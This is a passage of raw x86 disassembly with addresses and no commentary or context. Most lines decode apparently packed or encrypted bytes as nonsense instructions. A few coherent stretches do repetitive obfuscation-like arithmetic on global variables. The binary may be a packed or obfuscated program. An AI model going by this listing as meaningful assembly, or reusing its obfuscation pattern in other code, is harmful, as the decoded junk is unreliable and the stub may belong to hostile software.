  40a377:	inc    ecx
  40a378:	mov    WORD PTR [ebp-0x4e],?
  40a37b:	xchg   ebp,eax
  40a37c:	push   es
  40a37d:	and    edi,ecx
  40a37f:	retf   
  40a380:	(bad)  
  40a381:	jmp    0x40a373
  40a383:	pusha  
  40a384:	and    DWORD PTR [ebx-0x5c],edi
  40a387:	aam    0xa7
  40a389:	jmp    0x40a3d3
  40a38b:	sti    
  40a38c:	std    
  40a38d:	bswap  ebx
  40a38f:	iret   
  40a390:	xor    BYTE PTR [eax],al
  40a392:	sub    bl,BYTE PTR [ecx-0x2e5335e6]
  40a398:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a399:	sub    esp,DWORD PTR [eax+eiz*1]
  40a39c:	mov    BYTE PTR [edx],bh
  40a39e:	adc    DWORD PTR ds:0x8c6db748,edx
  40a3a4:	cli    
  40a3a5:	jne    0x40a36f
  40a3a7:	pop    esp
  40a3a8:	out    0x4c,eax
  40a3aa:	or     al,0xa1
  40a3ac:	cmp    eax,0x2e293a35
  40a3b1:	or     DWORD PTR [esp+eiz*2-0x46bf5a7e],esi
  40a3b8:	sbb    al,0xc6
  40a3ba:	pop    ecx
  40a3bb:	test   al,0x2c
  40a3bd:	outs   dx,DWORD PTR ds:[esi]
  40a3be:	jbe    0x40a3f5
  40a3c0:	neg    ch
  40a3c2:	jae    0x40a37b
  40a3c4:	call   0x749a:0xcdf96388
  40a3cb:	inc    ebx
  40a3cc:	cmp    dl,BYTE PTR [eax]
  40a3ce:	popf   
  40a3cf:	jecxz  0x40a3bb
  40a3d1:	add    BYTE PTR [edx],al
  40a3d3:	mov    ebx,ebx
  40a3d5:	push   ds
  40a3d6:	mov    dh,cl
  40a3d8:	sub    dl,BYTE PTR [edi-0x3b680386]
  40a3de:	adc    DWORD PTR [edx+0x1d268dde],edx
  40a3e4:	or     bh,BYTE PTR [ebx]
  40a3e6:	fisub  WORD PTR [esp+ebp*8]
  40a3e9:	int    0xbf
  40a3eb:	xor    al,0x28
  40a3ed:	xchg   ebx,eax
  40a3ee:	or     edi,DWORD PTR [esi+0x20171d56]
  40a3f4:	inc    esi
  40a3f5:	rol    DWORD PTR [esi-0x49],cl
  40a3f8:	pop    ds
  40a3f9:	(bad)  
  40a3fa:	test   al,0x6
  40a3fc:	dec    edi
  40a3fd:	or     eax,0x59ef2c97
  40a402:	mov    WORD PTR [eax+0x586aa61],es
  40a408:	jbe    0x40a400
  40a40a:	cmp    ebx,esi
  40a40c:	dec    esp
  40a40d:	mov    edx,DWORD PTR [ebp-0x4]
  40a410:	xor    edx,eax
  40a412:	adc    DWORD PTR ds:0x4335f3,0x43361f
  40a41c:	add    edx,ecx
  40a41e:	mov    DWORD PTR ds:0x43362b,0x68c0
  40a428:	cmp    edi,edx
  40a42a:	jb     0x40d767
  40a430:	mov    edx,DWORD PTR [ebp-0x28]
  40a433:	mov    edi,DWORD PTR [ebp-0x4]
  40a436:	xor    edx,eax
  40a438:	xor    ebx,ebx
  40a43a:	add    ebx,DWORD PTR ds:0x433563
  40a440:	and    DWORD PTR ds:0x43365f,ebx
  40a446:	xor    edi,eax
  40a448:	movzx  ebx,WORD PTR ds:0x433657
  40a44f:	sbb    DWORD PTR ds:0x433567,ebx
  40a455:	add    edi,ecx
  40a457:	add    DWORD PTR ds:0x4335f3,0x6da
  40a461:	add    edx,ecx
  40a463:	and    DWORD PTR ds:0x4335a7,0x0
  40a46d:	jmp    0x40a47f
  40a472:	mov    ebx,DWORD PTR ds:0x4335a7
  40a478:	inc    ebx
  40a479:	mov    DWORD PTR ds:0x4335a7,ebx
  40a47f:	cmp    DWORD PTR ds:0x4335a7,0x1c
  40a486:	jae    0x40a823
  40a48c:	cmp    DWORD PTR ds:0x4335a7,0x1e
  40a493:	jne    0x40a4a1
  40a499:	push   0x1
  40a49b:	call   DWORD PTR ds:0x412270
  40a4a1:	jmp    0x40a472
  40a4a6:	sbb    DWORD PTR ds:0x43366f,0x1f9a
  40a4b0:	jmp    0x40a823
  40a4b5:	shl    BYTE PTR [edi-0x482074c],cl
  40a4bb:	bnd jno 0x40a491
  40a4be:	lahf   
  40a4bf:	inc    edi
  40a4c0:	sbb    ebp,DWORD PTR ds:0x894b2e12
  40a4c6:	idiv   DWORD PTR [esp+edi*2-0x36]
  40a4ca:	jns    0x40a548
  40a4cc:	jl     0x40a531
  40a4ce:	das    
  40a4cf:	int3   
  40a4d0:	push   ds
  40a4d1:	sub    dl,bl
  40a4d3:	fidivr WORD PTR [ebx]
  40a4d5:	js     0x40a509
  40a4d7:	inc    edi
  40a4d8:	cs call 0x3f7:0x42d4f2dc
  40a4e0:	(bad)  
  40a4e1:	xor    esi,edi
  40a4e3:	ja     0x40a51a
  40a4e5:	adc    al,0x77
  40a4e7:	add    eax,0x914f70c5
  40a4ec:	and    BYTE PTR [esi],dh
  40a4ee:	je     0x40a4af
  40a4f0:	test   al,0x8e
  40a4f2:	sti    
  40a4f3:	or     eax,DWORD PTR [ebp+0x6a]
  40a4f6:	les    esp,FWORD PTR [ecx-0x7951f85f]
  40a4fc:	and    ebp,DWORD PTR [si+0x3a]
  40a500:	xchg   edx,eax
  40a501:	jge    0x40a4ab
  40a503:	push   0xffffffc0
  40a505:	dec    ecx
  40a506:	rcl    BYTE PTR [esi+ebp*8-0xa],0x73
  40a50b:	mov    eax,ds:0xdd8f1ccb
  40a510:	std    
  40a511:	std    
  40a512:	mov    al,ds:0x4281385
  40a517:	pop    ds
  40a518:	cld    
  40a519:	shl    BYTE PTR [eax-0x6b],cl
  40a51c:	jb     0x40a49e
  40a51e:	dec    ebx
  40a51f:	add    al,0x45
  40a521:	daa    
  40a522:	push   eax
  40a523:	and    DWORD PTR [esi+edx*4+0x3c52527e],ebx
  40a52a:	add    DWORD PTR [edx+0x6deec663],esp
  40a530:	imul   esp,DWORD PTR [edx-0x12db6d78],0x81312ff0
  40a53a:	stos   DWORD PTR es:[edi],eax
  40a53b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a53c:	pop    eax
  40a53d:	iret   
  40a53e:	cmc    
  40a53f:	xor    edi,DWORD PTR [edx+0x55ac87ba]
  40a545:	aam    0x5b
  40a547:	fcomp  QWORD PTR [ecx-0x56]
  40a54a:	fisttp QWORD PTR [eax]
  40a54c:	push   ss
  40a54d:	sub    dh,BYTE PTR [ecx-0x20]
  40a550:	cmp    esi,DWORD PTR [esi-0x59ad2864]
  40a556:	adc    al,0x1d
  40a558:	xchg   esp,eax
  40a559:	and    ecx,ecx
  40a55b:	ja     0x40a5a5
  40a55d:	bound  ebp,QWORD PTR [edx-0x4a]
  40a560:	shl    DWORD PTR [edx-0x78edf03b],cl
  40a566:	adc    ch,BYTE PTR [ecx]
  40a568:	jg     0x40a54f
  40a56a:	imul   edi,esp,0x13
  40a56d:	pop    es
  40a56e:	adc    DWORD PTR [ebp+0xb74ec14],esi
  40a574:	cmp    ch,BYTE PTR [ebx+0x58c224b1]
  40a57a:	push   esp
  40a57b:	ins    BYTE PTR es:[edi],dx
  40a57c:	aas    
  40a57d:	push   ebp
  40a57e:	int    0xf6
  40a580:	mov    BYTE PTR [ebx-0x53],ah
  40a583:	pop    eax
  40a584:	fidiv  WORD PTR [eax-0x2da79c5]
  40a58a:	lods   eax,DWORD PTR ds:[esi]
  40a58b:	loope  0x40a5de
  40a58d:	jne    0x40a56e
  40a58f:	retf   
  40a590:	pop    esi
  40a591:	inc    ebp
  40a592:	mov    edi,0x40d0b22d
  40a597:	aaa    
  40a598:	data16 xor BYTE PTR [edi+0x6],0x97
  40a59d:	xor    eax,0xee7c30b1
  40a5a2:	pop    ecx
  40a5a3:	out    dx,al
  40a5a4:	add    ch,BYTE PTR ds:0x22564055
  40a5aa:	loopne 0x40a614
  40a5ac:	add    DWORD PTR [edi+0x27a048b],ecx
  40a5b2:	jmp    0x40a625
  40a5b4:	cs (bad) 
  40a5b7:	clc    
  40a5b8:	test   eax,0xe54140b1
  40a5bd:	stc    
  40a5be:	push   ds
  40a5bf:	test   DWORD PTR [esp+eax*1+0x44],eax
  40a5c3:	adc    DWORD PTR [ebp+0x7f440b10],esi
  40a5c9:	hlt    
  40a5ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5cb:	pop    esp
  40a5cc:	push   esi
  40a5cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5ce:	sub    BYTE PTR [ecx-0x45],0xd6
  40a5d2:	jecxz  0x40a639
  40a5d4:	in     eax,dx
  40a5d5:	iret   
  40a5d6:	jmp    DWORD PTR [ebx]
  40a5d8:	jbe    0x40a55b
  40a5da:	hlt    
  40a5db:	imul   eax,DWORD PTR [edx+0x4d17a349],0x24
  40a5e2:	sub    eax,0x3af2e37d
  40a5e7:	jg     0x40a587
  40a5e9:	pop    es
  40a5ea:	xchg   ecx,eax
  40a5eb:	xchg   esp,eax
  40a5ec:	lea    eax,[eax+edi*4+0x12]
  40a5f0:	jmp    0x40a573
  40a5f2:	adc    edx,DWORD PTR [ebx]
  40a5f4:	cmp    edx,DWORD PTR [ecx]
  40a5f6:	arpl   WORD PTR [esi],bx
  40a5f8:	sbb    al,0x83
  40a5fa:	pop    es
  40a5fb:	mov    esi,0xde49a240
  40a600:	lods   al,BYTE PTR ds:[esi]
  40a601:	mov    edx,0x72533eea
  40a606:	fisubr DWORD PTR [esi+0x6]
  40a609:	pop    edi
  40a60a:	(bad)  
  40a60b:	popf   
  40a60c:	jae    0x40a666
  40a60e:	enter  0x301a,0x8
  40a612:	sbb    al,0xdf
  40a614:	sbb    edx,DWORD PTR [ebp-0x5f02702c]
  40a61a:	xor    DWORD PTR [eax+0x73a1d879],0x55
  40a621:	ja     0x40a5ed
  40a623:	mov    bh,0xa
  40a625:	dec    esp
  40a626:	leave  
  40a627:	mov    edx,0xe8056fd4
  40a62c:	shl    BYTE PTR ds:0x28764253,cl
  40a632:	add    DWORD PTR [ebx],eax
  40a634:	sbb    DWORD PTR [edx+0x6fbbb87c],eax
  40a63a:	jge    0x40a5de
  40a63c:	pop    ecx
  40a63d:	push   edx
  40a63e:	mov    al,ds:0x14b4957d
  40a643:	gs ja  0x40a5e9
  40a646:	in     eax,dx
  40a647:	iret   
  40a648:	jns    0x40a68d
  40a64a:	imul   DWORD PTR [ebx]
  40a64c:	sub    al,0x76
  40a64e:	fdivrp st(4),st
  40a650:	inc    edi
  40a651:	retf   
  40a652:	sahf   
  40a653:	sti    
  40a654:	cs das 
  40a656:	sub    eax,0x9ba94da9
  40a65b:	sar    BYTE PTR [eax],1
  40a65d:	data16 clc 
  40a65f:	sub    esp,DWORD PTR [ebx]
  40a661:	push   eax
  40a662:	shl    DWORD PTR [eax-0x53],1
  40a665:	xchg   BYTE PTR [edi-0x1583b184],al
  40a66b:	or     BYTE PTR [ebp+0x77d97504],ch
  40a671:	add    al,0x5
  40a673:	les    esi,FWORD PTR [ebp+0x75]
  40a676:	pop    esi
  40a677:	rcl    BYTE PTR [eax+ecx*8-0x60],1
  40a67b:	sbb    eax,0x9d513390
  40a680:	adc    ch,BYTE PTR gs:[ebx]
  40a683:	iret   
  40a684:	dec    ebx
  40a685:	std    
  40a686:	cmp    al,0x41
  40a688:	in     al,dx
  40a689:	xchg   ebp,eax
  40a68a:	xchg   edi,eax
  40a68b:	push   ebp
  40a68c:	push   edx
  40a68d:	(bad)  
  40a68e:	fmul   st(0),st
  40a690:	mov    DWORD PTR [edi],eax
  40a692:	hlt    
  40a693:	(bad)
  40a696:	inc    edi
  40a697:	bnd js 0x40a62a
  40a69a:	inc    edx
  40a69b:	jb     0x40a709
  40a69d:	dec    esp
  40a69e:	mov    ebx,0x940f5ef4
  40a6a3:	mov    ebx,DWORD PTR [esi]
  40a6a5:	mov    DWORD PTR [ecx+0x26],edx
  40a6a8:	or     BYTE PTR [esi],ch
  40a6aa:	cmp    eax,0xae32d5a5
  40a6af:	jns    0x40a66b
  40a6b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6b2:	add    al,0xf1
  40a6b4:	sub    al,0xa3
  40a6b6:	neg    DWORD PTR [ecx-0x7279d48a]
  40a6bc:	cld    
  40a6bd:	lahf   
  40a6be:	pushf  
  40a6bf:	fs test al,0x1e
  40a6c2:	popa   
  40a6c3:	stos   BYTE PTR es:[edi],al
  40a6c4:	xlat   BYTE PTR ds:[ebx]
  40a6c5:	pop    ebx
  40a6c6:	jne    0x40a6b3
  40a6c8:	mov    al,cl
  40a6ca:	test   BYTE PTR [ebp-0x7b7c4477],ch
  40a6d0:	adc    DWORD PTR [edi-0x47],ebx
  40a6d3:	mov    eax,0x4b8218df
  40a6d8:	out    0x89,al
  40a6da:	repnz pop ecx
  40a6dc:	push   0xef874123
  40a6e1:	sub    al,0x80
  40a6e3:	sub    esp,edx
  40a6e5:	jo     0x40a701
  40a6e7:	mov    WORD PTR [ebx],ds
  40a6e9:	inc    eax
  40a6ea:	or     eax,0x590af146
  40a6ef:	enter  0xe3ec,0x7e
  40a6f3:	fbld   TBYTE PTR [eax-0x31]
  40a6f6:	arpl   ax,si
  40a6f8:	cli    
  40a6f9:	sbb    BYTE PTR [esp+ecx*1+0x54],ah
  40a6fd:	mov    cl,0x6f
  40a6ff:	push   esi
  40a700:	or     eax,0x9bb9adfb
  40a705:	ret    
  40a706:	out    0x60,al
  40a708:	sub    BYTE PTR [ecx],cl
  40a70a:	or     edx,DWORD PTR es:[ebp-0x752f9ee5]
  40a711:	frstor [eax]
  40a713:	mov    DWORD PTR [ecx+0x31],edi
  40a716:	mov    bh,0x91
  40a718:	xor    eax,DWORD PTR [esi+0x4c1ef67a]
  40a71e:	mov    al,ds:0x9734c502
  40a723:	fcomp  QWORD PTR [ecx+0x32d73d04]
  40a729:	push   edi
  40a72a:	sub    eax,0xaffc25ae
  40a72f:	lahf   
  40a730:	fild   QWORD PTR [ecx-0x1e5b3471]
  40a736:	icebp  
  40a737:	test   al,bl
  40a739:	adc    DWORD PTR [edi],0xffffffb9
  40a73c:	enter  0x845d,0xc1
  40a740:	(bad)  
  40a741:	push   0xfab0851e
  40a746:	fdivr  st,st(1)
  40a748:	ret    0x2f6a
  40a74b:	or     DWORD PTR [ebp+0x78],eax
  40a74e:	(bad)  
  40a74f:	jo     0x40a759
  40a751:	ja     0x40a75f
  40a753:	pop    esi
  40a754:	les    ecx,FWORD PTR ds:0x5400ee43
  40a75a:	mov    ecx,DWORD PTR ds:0xa521731e
  40a760:	xchg   BYTE PTR [ebp-0x37010936],bl
  40a766:	jns    0x40a7e1
  40a768:	push   esp
  40a769:	add    DWORD PTR [eax],eax
  40a76b:	jg     0x40a71f
  40a76d:	sub    DWORD PTR [ebx+0x3a],ebp
  40a770:	out    0xab,al
  40a772:	sbb    cl,cl
  40a774:	cld    
  40a775:	std    
  40a776:	je     0x40a7a7
  40a778:	adc    DWORD PTR [edx],ecx
  40a77a:	out    dx,al
  40a77b:	cmp    bl,BYTE PTR [edx+ebx*4+0xae8551a]
  40a782:	sbb    BYTE PTR [ecx],dl
  40a784:	pop    ss
  40a785:	outs   dx,BYTE PTR ds:[esi]
  40a786:	into   
  40a787:	and    al,0x5a
  40a789:	sub    BYTE PTR [edi],0xfe
  40a78c:	dec    ebp
  40a78d:	call   0x1c42:0x77265c74
  40a794:	stos   DWORD PTR es:[edi],eax
  40a795:	adc    dl,BYTE PTR [edi-0x3354724]
  40a79b:	xchg   ecx,eax
  40a79c:	sbb    ah,BYTE PTR [ebp+0x54]
  40a79f:	popa   
  40a7a0:	xchg   edi,eax
  40a7a1:	and    BYTE PTR [ebp+eax*1+0x65287121],ch
  40a7a8:	pop    ebp
  40a7a9:	loope  0x40a731
  40a7ab:	and    DWORD PTR ds:[esi-0x6265964b],ebp
  40a7b2:	jecxz  0x40a7a9
  40a7b4:	push   esp
  40a7b5:	std    
  40a7b6:	mov    esp,0x7afcc95
  40a7bb:	sub    DWORD PTR [esi-0x3db3cd54],esi
  40a7c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7c2:	adc    BYTE PTR [esi],al
  40a7c4:	mov    eax,ds:0x2842f849
  40a7c9:	add    BYTE PTR [edi+0x45],0x6d
  40a7cd:	push   esi
  40a7ce:	jo     0x40a766
  40a7d0:	push   cs
  40a7d1:	sub    ebp,DWORD PTR [edx]
  40a7d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7d4:	jbe    0x40a765
  40a7d6:	mov    ecx,DWORD PTR [ebp-0x27b34848]
  40a7dc:	mov    dl,bl
  40a7de:	mul    DWORD PTR [edx+0x7f]
  40a7e1:	call   0xe097830f
  40a7e6:	out    dx,al
  40a7e7:	mov    ch,0x61
  40a7e9:	(bad)  
  40a7ea:	fcomp  QWORD PTR [esi+edi*2+0x5a7177aa]
  40a7f1:	inc    ebp
  40a7f2:	sub    DWORD PTR [eax],esi
  40a7f4:	(bad)  
  40a7f5:	(bad)  
  40a7f6:	pop    ebp
  40a7f7:	inc    eax
  40a7f8:	push   ss
  40a7f9:	stos   DWORD PTR es:[edi],eax
  40a7fa:	je     0x40a7f2
  40a7fc:	fstp   DWORD PTR [esp+eax*1]
  40a7ff:	aas    
  40a800:	cmp    BYTE PTR [eax-0x7d],ch
  40a803:	dec    edx
  40a804:	dec    eax
  40a805:	xchg   ebp,eax
  40a806:	popa   
  40a807:	(bad)  
  40a808:	cmp    al,ch
  40a80a:	inc    esp
  40a80b:	xchg   ecx,eax
  40a80c:	mov    esi,0x33102159
  40a811:	pop    ds
  40a812:	cs adc ecx,eax
  40a815:	ret    0x6830
  40a818:	or     BYTE PTR [ebx+eax*8+0x24],dl
  40a81c:	lods   eax,DWORD PTR ds:[esi]
  40a81d:	dec    ecx
  40a81e:	xchg   esp,eax
  40a81f:	ficomp WORD PTR [edi-0x78]
  40a822:	mov    cl,0xf
  40a824:	scas   eax,DWORD PTR es:[edi]
  40a825:	xlat   BYTE PTR ds:[ebx]
  40a826:	adc    DWORD PTR ds:0x4335af,ebx
  40a82c:	mov    edi,DWORD PTR [ebp-0x8]
  40a82f:	or     DWORD PTR ds:0x4335ab,ecx
  40a835:	mov    ebx,DWORD PTR [ebp-0x10]
  40a838:	sub    ebx,edi
  40a83a:	cmp    ebx,edx
  40a83c:	mov    DWORD PTR ds:0x4335ef,0x652d
  40a846:	ja     0x40a872
  40a84c:	xor    edx,DWORD PTR ds:0x433597
  40a852:	mov    edx,DWORD PTR [ebp-0x4]
  40a855:	sbb    DWORD PTR ds:0x4335df,0x855
  40a85f:	xor    edx,eax
  40a861:	add    edx,ecx
  40a863:	mov    DWORD PTR ds:0x4335af,0x65c5
  40a86d:	jmp    0x40bab5
  40a872:	mov    ebx,DWORD PTR ds:0x433623
  40a878:	sub    ebx,DWORD PTR ds:0x43354f
  40a87e:	mov    DWORD PTR ds:0x433623,ebx
  40a884:	mov    edx,DWORD PTR [ebp-0x2c]
  40a887:	mov    edi,DWORD PTR [ebp-0x4]
  40a88a:	or     DWORD PTR ds:0x433597,ebx
  40a890:	xor    edx,eax
  40a892:	xor    edi,eax
  40a894:	movzx  ebx,BYTE PTR ds:0x433617
  40a89b:	adc    DWORD PTR ds:0x433553,ebx
  40a8a1:	add    edi,ecx
  40a8a3:	add    edx,ecx
  40a8a5:	imul   edx,edi
  40a8a8:	adc    DWORD PTR ds:0x4335a7,edi
  40a8ae:	mov    edi,DWORD PTR [ebp-0x8]
  40a8b1:	mov    ebx,DWORD PTR [ebp-0x10]
  40a8b4:	sub    ebx,edi
  40a8b6:	cmp    ebx,edx
  40a8b8:	ja     0x40a8c6
  40a8be:	mov    edx,DWORD PTR [ebp-0x28]
  40a8c1:	jmp    0x40baa7
  40a8c6:	mov    edx,DWORD PTR [ebp-0x30]
  40a8c9:	mov    edi,DWORD PTR [ebp-0x4]
  40a8cc:	xor    edx,eax
  40a8ce:	xor    edi,eax
  40a8d0:	jmp    0x40ac43
  40a8d5:	call   0x73960c99
  40a8da:	jge    0x40a8ce
  40a8dc:	pop    ecx
  40a8dd:	jno    0x40a8ff
  40a8df:	aad    0xd1
  40a8e1:	add    edx,ecx
  40a8e3:	cli    
  40a8e4:	push   ebp
  40a8e5:	addr16 lock jl 0x40a965
  40a8e9:	retf   0x7c79
  40a8ec:	jl     0x40a87f
  40a8ee:	inc    edx
  40a8ef:	pop    ss
  40a8f0:	es jmp 0x40a879
  40a8f3:	cmp    cl,BYTE PTR [ecx]
  40a8f5:	cmp    dh,BYTE PTR [esi]
  40a8f7:	pop    ebx
  40a8f8:	out    0x8a,eax
  40a8fa:	sub    edi,DWORD PTR [esi-0x365d2361]
  40a900:	adc    al,0xff
  40a902:	imul   eax,ecx,0x65
  40a905:	icebp  
  40a906:	pusha  
  40a907:	andnps xmm3,XMMWORD PTR [eax-0x1930a2f]
  40a90e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a90f:	aas    
  40a910:	dec    edx
  40a911:	rcr    DWORD PTR [esi+ecx*8+0x5390a740],1
  40a918:	sub    eax,0xc5da5947
  40a91d:	xchg   edx,eax
  40a91e:	stc    
  40a91f:	lock ret 
  40a921:	sub    DWORD PTR [edx],ecx
  40a923:	ret    
  40a924:	test   eax,0x3f62b215
  40a929:	push   edi
  40a92a:	xchg   esi,eax
  40a92b:	int3   
  40a92c:	repnz adc al,BYTE PTR [ecx+0xa]
  40a930:	lahf   
  40a931:	fsub   QWORD PTR [eax]
  40a933:	cmp    BYTE PTR [edx+edi*8-0xa],dh
  40a937:	adc    al,BYTE PTR [edi]
  40a939:	shl    BYTE PTR [esi+0x63],cl
  40a93c:	mov    cl,0x14
  40a93e:	xlat   BYTE PTR ds:[ebx]
  40a93f:	lods   al,BYTE PTR ds:[esi]
  40a940:	xor    BYTE PTR [ebp+0x7df61fcf],dl
  40a946:	cmp    eax,0xa057ae45
  40a94b:	sbb    esi,DWORD PTR [ecx+eax*1]
  40a94e:	sub    edx,DWORD PTR [esi+0x2]
  40a951:	ret    
  40a952:	mov    ch,0x63
  40a954:	jnp    0x40a991
  40a956:	push   edx
  40a957:	pushf  
  40a958:	jge    0x40a918
  40a95a:	sub    bl,BYTE PTR [ecx]
  40a95c:	ret    
  40a95d:	test   BYTE PTR [edi-0x49],al
  40a960:	pop    ds
  40a961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a962:	sub    edi,DWORD PTR [eax-0x63]
  40a965:	int3   
  40a966:	loope  0x40a974
  40a968:	nop
  40a969:	mov    bh,BYTE PTR [esp+esi*1]
  40a96c:	stos   DWORD PTR es:[edi],eax
  40a96d:	shl    esp,cl
  40a96f:	dec    esp
  40a970:	cli    
  40a971:	(bad)  
  40a972:	test   BYTE PTR [edx-0x74],bl
  40a975:	xchg   ecx,eax
  40a976:	stos   DWORD PTR es:[edi],eax
  40a977:	add    bl,dh
  40a979:	jbe    0x40a901
  40a97b:	mov    ds:0xd6c3ddd5,eax
  40a980:	ret    0x5986
  40a983:	repz popa 
  40a985:	push   edx
  40a986:	push   ecx
  40a987:	add    al,0xe7
  40a989:	lahf   
  40a98a:	jmp    0x4d2e88ed
  40a98f:	pop    ebp
  40a990:	mov    eax,0x6335df6c
  40a995:	into   
  40a996:	fild   QWORD PTR [eax-0x2352a084]
  40a99c:	(bad)  
  40a99d:	jecxz  0x40a9d4
  40a99f:	dec    edx
  40a9a0:	loop   0x40a9f1
  40a9a2:	mov    al,0x9e
  40a9a4:	xchg   esi,eax
  40a9a5:	adc    eax,0x21b2a95e
  40a9aa:	xchg   BYTE PTR [eax+0x610ac076],ch
  40a9b0:	sbb    esi,ebp
  40a9b2:	pop    ecx
  40a9b3:	mov    ebp,0x93afe1d
  40a9b8:	pop    es
  40a9b9:	inc    ebx
  40a9ba:	jno    0x40a991
  40a9bc:	push   ecx
  40a9bd:	mov    dl,0xee
  40a9bf:	add    bh,ch
  40a9c1:	popa   
  40a9c2:	lods   al,BYTE PTR ds:[esi]
  40a9c3:	shr    DWORD PTR [eax-0x77],cl
  40a9c6:	mov    cl,0x1e
  40a9c8:	js     0x40a986
  40a9ca:	pushf  
  40a9cb:	adc    bh,BYTE PTR [eax]
  40a9cd:	in     eax,0x18
  40a9cf:	ffreep st(0)
  40a9d1:	inc    edi
  40a9d2:	xchg   edx,eax
  40a9d3:	pop    esp
  40a9d4:	fdivr  st(5),st
  40a9d6:	sbb    al,0xd7
  40a9d8:	out    dx,al
  40a9d9:	cld    
  40a9da:	pop    esp
  40a9db:	sub    dh,BYTE PTR [ebp-0x24]
  40a9de:	jb     0x40a9a8
  40a9e0:	cwde   
  40a9e1:	out    dx,al
  40a9e2:	mov    ch,0xf5
  40a9e4:	inc    edx
  40a9e5:	pop    ecx
  40a9e6:	or     DWORD PTR [ebx],edx
  40a9e8:	repnz loop 0x40aa05
  40a9eb:	pop    ds
  40a9ec:	inc    ebx
  40a9ed:	test   DWORD PTR [esi+0x7d11cb45],edi
  40a9f3:	in     eax,0xe
  40a9f5:	nop
  40a9f6:	cdq    
  40a9f7:	out    0xc6,al
  40a9f9:	sub    BYTE PTR [eax+0x2b],bh
  40a9fc:	or     edi,edi
  40a9fe:	ds scas eax,DWORD PTR es:[edi]
  40aa00:	xchg   DWORD PTR [ecx-0xb],ebx
  40aa03:	dec    ebp
  40aa04:	xor    ecx,ecx
  40aa06:	addr16 repnz dec esp
  40aa09:	idiv   BYTE PTR [ebx+eax*8-0x66]
  40aa0d:	jo     0x40aa47
  40aa0f:	jne    0x40a9ff
  40aa11:	adc    eax,0xb043cee4
  40aa16:	add    al,BYTE PTR [ecx]
  40aa18:	rol    BYTE PTR [ebx+edx*1+0x126088b8],0x3f
  40aa20:	jmp    0x40aa95
  40aa22:	leave  
  40aa23:	mov    eax,ds:0x2e2c0742
  40aa28:	lds    ecx,FWORD PTR fs:[eax+0xee3d0cc]
  40aa2f:	shl    BYTE PTR [edi],cl
  40aa31:	sar    DWORD PTR [edi],1
  40aa33:	jae    0x40aa35
  40aa35:	push   DWORD PTR [ecx-0x219cc826]
  40aa3b:	dec    bp
  40aa3d:	mov    ebp,0x6f17c9f4
  40aa42:	mov    ch,0xcc
  40aa44:	(bad)  
  40aa45:	xchg   esp,eax
  40aa46:	cld    
  40aa47:	xor    edi,DWORD PTR [ebp-0x10]
  40aa4a:	xor    DWORD PTR [edi+0x362a4ffa],edx
  40aa50:	outs   dx,DWORD PTR ds:[esi]
  40aa51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa52:	(bad)  
  40aa53:	jne    0x40a9fc
  40aa55:	int    0xb0
  40aa57:	or     al,0x73
  40aa59:	mov    al,ds:0xb75b8450
  40aa5e:	sar    DWORD PTR [ecx+esi*1+0x16],1
  40aa62:	jmp    0x399644cd
  40aa67:	jae    0x40aa3c
  40aa69:	mov    ah,0xa8
  40aa6b:	stos   BYTE PTR es:[edi],al
  40aa6c:	call   0x6524:0x44383f1a
  40aa73:	push   ebp
  40aa74:	mov    bl,0xb0
  40aa76:	test   BYTE PTR [esi+edx*4-0x3661f0fc],0xeb
  40aa7e:	or     BYTE PTR [ebp-0x609954f],al
  40aa84:	jns    0x40aa7c
  40aa86:	adc    al,0xd6
  40aa88:	add    DWORD PTR ds:0x44ca32c7,0x47
  40aa8f:	push   ebp
  40aa90:	retf   
  40aa91:	pop    ebp
  40aa92:	sbb    BYTE PTR [esi],dh
  40aa94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa95:	ss push ebp
  40aa97:	pop    ebp
  40aa98:	and    eax,0x665ea506
  40aa9d:	test   BYTE PTR [ebp-0x74],cl
  40aaa0:	push   edi
  40aaa1:	add    ecx,edx
  40aaa3:	imul   esp,ebx,0xffffffd5
  40aaa6:	add    cl,BYTE PTR [esi+edx*1+0x720d96b6]
  40aaad:	cmovnp ebx,DWORD PTR [edx]
  40aab0:	adc    eax,0x60fcd60e
  40aab5:	ins    BYTE PTR es:[edi],dx
  40aab6:	push   es
  40aab7:	push   edx
  40aab8:	loop   0x40ab17
  40aaba:	jg     0x40aadb
  40aabc:	jp     0x40aa67
  40aabe:	cmp    bl,BYTE PTR [edi]
  40aac0:	push   ebx
  40aac1:	mov    esi,0xe30d7f5
  40aac6:	sbb    BYTE PTR [ebp+0x7ab9f95f],al
  40aacc:	imul   eax,DWORD PTR [ecx-0x17af418f],0x5425695b
  40aad6:	cmp    DWORD PTR [ebx+ebx*2],0x4f
  40aada:	iret   
  40aadb:	add    al,0xdc
  40aadd:	fldlg2 
  40aadf:	push   es
  40aae0:	or     cl,BYTE PTR [esi+0x2f]
  40aae3:	rcr    esi,0x9d
  40aae6:	stos   BYTE PTR es:[edi],al
  40aae7:	adc    dl,cl
  40aae9:	in     eax,0x2a
  40aaeb:	retf   
  40aaec:	push   cs
  40aaed:	sti    
  40aaee:	jb     0x40ab6f
  40aaf0:	pop    ds
  40aaf1:	xor    al,BYTE PTR [ebp+0x28]
  40aaf4:	aaa    
  40aaf5:	in     eax,0x83
  40aaf7:	mov    ch,0xe3
  40aaf9:	test   DWORD PTR [ebx+0x2c],esi
  40aafc:	nop
  40aafd:	xchg   edx,eax
  40aafe:	rcr    DWORD PTR [eax-0x165fc9d4],cl
  40ab04:	inc    esp
  40ab05:	push   edx
  40ab06:	push   es
  40ab07:	adc    ebp,DWORD PTR [ebx]
  40ab09:	popf   
  40ab0a:	adc    al,0x41
  40ab0c:	jecxz  0x40ab8c
  40ab0e:	xchg   DWORD PTR [edi],edi
  40ab10:	push   cs
  40ab11:	mov    ds:0x9c8caf6a,al
  40ab16:	push   ss
  40ab17:	pop    edi
  40ab18:	add    eax,0x2e3aa41d
  40ab1d:	jno    0x40aaef
